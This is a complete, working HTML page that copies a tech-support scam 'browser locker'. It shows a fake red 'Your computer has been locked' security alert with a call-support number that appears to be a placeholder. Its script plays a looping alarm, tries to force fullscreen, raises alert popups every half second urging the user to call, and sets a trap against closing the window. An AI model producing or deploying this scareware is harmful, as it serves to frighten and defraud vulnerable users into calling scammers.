<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Security Alert</title>
  <style>
    body {
      margin: 0;
      background-color: black;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      color: red;
      font-size: 2em;
      font-family: Arial, sans-serif;
      text-align: center;
    }
    #message {
      max-width: 700px;
    }
  </style>
</head>
<body>
  <div id="message">
    ⚠️ SECURITY ALERT ⚠️<br><br>
    Your computer has been locked.<br>
    Do not turn off your PC.<br>
    Call Support: <strong>+1-800-FAKE-NUM</strong>
  </div>

  <audio autoplay loop>
    <source src="https://actions.google.com/sounds/v1/alarms/beep_short.ogg" type="audio/ogg">
  </audio>

  <script>
    // Fullscreen attempt
    document.documentElement.requestFullscreen().catch(()=>{});

    // Popup loop
    function scareLoop() {
      alert("WARNING: Your computer may be infected!\n\nCall +1-800-FAKE-NUM immediately!");
      setTimeout(scareLoop, 500);
    }
    setTimeout(scareLoop, 1500);

    // Trap if they try to close
    window.onbeforeunload = function() {
      return "WARNING: Closing this window may result in data loss!";
    };
  </script>
</body>
</html>
